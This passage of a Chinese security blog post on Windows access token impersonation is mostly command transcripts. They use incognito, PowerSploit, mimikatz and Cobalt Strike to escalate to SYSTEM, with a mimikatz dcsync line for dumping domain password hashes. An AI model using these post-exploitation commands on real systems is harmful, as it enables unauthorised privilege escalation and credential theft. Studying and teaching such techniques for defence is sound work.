+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">C:\MK&gt;incognito.exe execute -c <span class="hljs-string">&quot;L-PC\shiyan&quot;</span> calc.exe  <span class="hljs-comment"># 利用shiyan的令牌运行个计算器 </span><br>[-] WARNING: Not running <span class="hljs-keyword">as</span> SYSTEM. Not <span class="hljs-built_in">all</span> tokens will be available.<br>[*] Enumerating tokens<br>[*] Searching <span class="hljs-keyword">for</span> availability of requested token<br>[+] Requested token found<br>[-] No Delegation token available<br>[*] Attempting to create new child process <span class="hljs-keyword">and</span> communicate via anonymous pipe<br></code></pre></td></tr></table></figure>
+
+<p><img src="http://sh1yan.top/photo/Windows-Access-Token-Security-Exploration/%E4%BB%A4%E7%89%8C%E4%BC%AA%E9%80%A0%E8%BF%90%E8%A1%8C%E8%AE%A1%E7%AE%97%E5%99%A8.png" srcset="/img/loading.gif" lazyload></p>
+<p>OK！伪造成功。</p>
+<p>那继续提升下权限吧！既然都 list 出 system 的令牌了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">C:\MK&gt;incognito.exe execute -c <span class="hljs-string">&quot;NT AUTHORITY\SYSTEM&quot;</span> cmd.exe  <span class="hljs-comment"># 将当前cmd提升到 system 权限</span><br>[-] WARNING: Not running <span class="hljs-keyword">as</span> SYSTEM. Not <span class="hljs-built_in">all</span> tokens will be available.<br>[*] Enumerating tokens<br>[*] Searching <span class="hljs-keyword">for</span> availability of requested token<br>[+] Requested token found<br>[+] Delegation token available<br>[*] Attempting to create new child process <span class="hljs-keyword">and</span> communicate via anonymous pipe<br><br>Microsoft Windows [版本 <span class="hljs-number">6.1</span><span class="hljs-number">.7601</span>]<br>版权所有 (c) <span class="hljs-number">2009</span> Microsoft Corporation。保留所有权利。<br><br>C:\MK&gt;whoami  <span class="hljs-comment"># 查看当前用户</span><br>whoami<br>nt authority\system<br></code></pre></td></tr></table></figure>
+
+<p>同时，如果想还原的话，就执行下句就还原一开始的token了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">incognito.exe execute -c <span class="hljs-string">&quot;L-PC\L&quot;</span> cmd.exe<br></code></pre></td></tr></table></figure>
+
+
+
+<p>3、Invoke-TokenManipulation.ps1 脚本</p>
+<p>Invoke-TokenManipulation.ps1脚本来源于PowerSploit，一个基于powershell的强大的后渗透框架。</p>
+<p>脚本地址：<a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1</a></p>
+<p>由于本地测试环境的问题，各种问题，并且调整限制后，依旧还是存在问题，我就只贴代码了。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-number">1</span>. 想法提升当前用户权限为 system 后，再执行操作。<br><span class="hljs-built_in">PS</span> &gt; .\<span class="hljs-built_in">Invoke-TokenManipulation</span> <span class="hljs-literal">-Enumerate</span> | <span class="hljs-built_in">out-file</span> token.txt <span class="hljs-comment"># 列出当前散落的令牌，并保存到 token.txt 文件里。</span><br><span class="hljs-built_in">PS</span> &gt; .\<span class="hljs-built_in">Invoke-TokenManipulation</span> <span class="hljs-literal">-Enumerate</span>  <span class="hljs-comment"># 列举当前计算机散落的令牌</span><br><span class="hljs-built_in">PS</span> &gt; .\<span class="hljs-built_in">Invoke-TokenManipulation</span> <span class="hljs-literal">-CreateProcess</span> <span class="hljs-string">&quot;cmd.exe&quot;</span> <span class="hljs-literal">-Username</span> <span class="hljs-string">&quot;NT AUTHORITY\SYSTEM&quot;</span>  <span class="hljs-comment"># 将当前cmd提升至system权限下</span><br><span class="hljs-built_in">PS</span> &gt; .\<span class="hljs-built_in">Invoke-TokenManipulation</span> <span class="hljs-literal">-CreateProces</span> <span class="hljs-string">&quot;cmd.exe&quot;</span> <span class="hljs-literal">-ProcesId</span> <span class="hljs-number">1234</span> <span class="hljs-comment"># 已UID的形式，提升权限</span><br><br><br></code></pre></td></tr></table></figure>
+
+
+
+<p>4、Mimkatz 中的 token::list</p>
+<p>把mimikatz放到目标机后。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python">C:\MK &gt; mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;token::whoami&quot;</span> <span class="hljs-string">&quot;TOKEN::List&quot;</span> &gt; token_log.txt<br> .<span class="hljs-comment">#####.   mimikatz 2.0 alpha (x86) release &quot;Kiwi en C&quot; (Oct 16 2015 01:35:44)</span><br> .<span class="hljs-comment">## ^ ##.  </span><br> <span class="hljs-comment">## / \ ##  /* * *</span><br> <span class="hljs-comment">## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span><br> <span class="hljs-string">&#x27;## v ##&#x27;</span>   http://blog.gentilkiwi.com/mimikatz             (oe.eo)<br>  <span class="hljs-string">&#x27;#####&#x27;</span>                                     <span class="hljs-keyword">with</span> <span class="hljs-number">17</span> modules * * */<br><br><br>mimikatz(commandline) <span class="hljs-comment"># privilege::debug</span><br>Privilege <span class="hljs-string">&#x27;20&#x27;</span> OK<br><br>mimikatz(commandline) <span class="hljs-comment"># token::whoami</span><br> * Process Token : <span class="hljs-number">1844846</span>   	L-PC\L	S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">468267683</span>-<span class="hljs-number">2575715905</span>-<span class="hljs-number">647264286</span>-<span class="hljs-number">1000</span>	(12g,23p)	Primary<br> * Thread Token  : no token<br><br>mimikatz(commandline) <span class="hljs-comment"># TOKEN::List</span><br>Token Id  : <span class="hljs-number">0</span><br>User name : <br>SID name  : <br><br><span class="hljs-number">244</span>	<span class="hljs-number">34806</span>     	NT AUTHORITY\SYSTEM	S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">18</span>	(04g,30p)	Primary<br>......<br><span class="hljs-number">4900</span>	<span class="hljs-number">659843</span>    	L-PC\L	S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">468267683</span>-<span class="hljs-number">2575715905</span>-<span class="hljs-number">647264286</span>-<span class="hljs-number">1000</span>	(12g,23p)	Primary<br>.......<br><span class="hljs-number">492</span>	<span class="hljs-number">71647</span>     	NT AUTHORITY\NETWORK SERVICE	S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">20</span>	(10g,03p)	Primary<br>.......<br><span class="hljs-number">492</span>	<span class="hljs-number">73243</span>     	NT AUTHORITY\LOCAL SERVICE	S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">19</span>	(15g,04p)	Primary<br>.......<br>mimikatz <span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure>
+
+<p>因为 TOKEN::List 操作，列举的太多了，我就以点省略了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">TOKEN::Elevate 把当前提升为 sytem 令牌<br></code></pre></td></tr></table></figure>
+
+<p><img src="http://sh1yan.top/photo/Windows-Access-Token-Security-Exploration/%E7%8C%95%E7%8C%B4%E6%A1%83%E6%8A%93%E5%8F%96.png" srcset="/img/loading.gif" lazyload></p>
+<p>其它的命令还剩下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">mikatz <span class="hljs-comment"># TOKEN::Elevate /domainadmin 模拟域管令牌</span><br>mikatz <span class="hljs-comment"># lsadump::dcsync /domain:rotkit.org /al /csv 导出域控种的所有用户的密码 hash</span><br>mikatz <span class="hljs-comment"># token::revrt 还原令牌到初始状态</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>5、CobaltSrike 中的 steal_token 插件</p>
+<p>CS这个工具，我对这个也不是很熟练，而且相应演练环境也怎么弄过，就直接贴操作命令了。</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ruby">beacon&gt; getuid  <span class="hljs-comment"># 查看当前用户</span><br>beacon&gt; elvate ms14-058 sytem  <span class="hljs-comment"># 利用 ms14-058 进行提升权限</span><br>beacon&gt; steal_token <span class="hljs-number">1234</span>  <span class="hljs-comment"># 伪造UID为 1234 进程的用户令牌</span><br>beacon&gt; rev2self <span class="hljs-comment"># 返回原始令牌</span><br></code></pre></td></tr></table></figure>
+
+<p>很多理论性的东西，只要自己操作一遍，才会知道，原来会有这么多坑。。。</p>
+<p><strong>0x07 参考文章</strong></p>
+<p>[1] <a target="_blank" rel="noopener" href="https://blog.csdn.net/huhaoxuan2010/article/details/78404136">https://blog.csdn.net/huhaoxuan2010/article/details/78404136</a><br>[2] <a target="_blank" rel="noopener" href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Token%E7%AA%83%E5%8F%96%E4%B8%8E%E5%88%A9%E7%94%A8/">https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Token%E7%AA%83%E5%8F%96%E4%B8%8E%E5%88%A9%E7%94%A8/</a><br>[3] <a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E8%AE%BF%E9%97%AE%E4%BB%A4%E7%89%8C/16846911?fr=aladdin">https://baike.baidu.com/item/%E8%AE%BF%E9%97%AE%E4%BB%A4%E7%89%8C/16846911?fr=aladdin</a><br>[4] <a target="_blank" rel="noopener" href="https://www.lshack.cn/721/">https://www.lshack.cn/721/</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/" class="category-chain-item">漏洞研究</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/access-token/" class="print-no-link">#access token</a>
+      
+        <a href="/tags/%E4%BB%A4%E7%89%8C%E4%BC%AA%E9%80%A0/" class="print-no-link">#令牌伪造</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Windows访问令牌安全探究</div>
+      <div>https://sh1yan.top/2019/06/09/Windows-Access-Token-Security-Exploration/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>shiyan</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2019年6月9日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2019/06/16/The-Principle-and-Practice-of-DLL-Hijacking/" title="DLL劫持原理与实践">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">DLL劫持原理与实践</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2019/06/03/Discussion-on-Silver-Bill-and-Gold-Bill/" title="白银票据与黄金票据探究">
+                        <span class="hidden-mobile">白银票据与黄金票据探究</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a  rel="nofollow noopener"><span>Copyrights &copy; 2016-2024</span></a> <i class="iconfont icon-love"></i> <a  rel="nofollow noopener"><span>shiyan</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
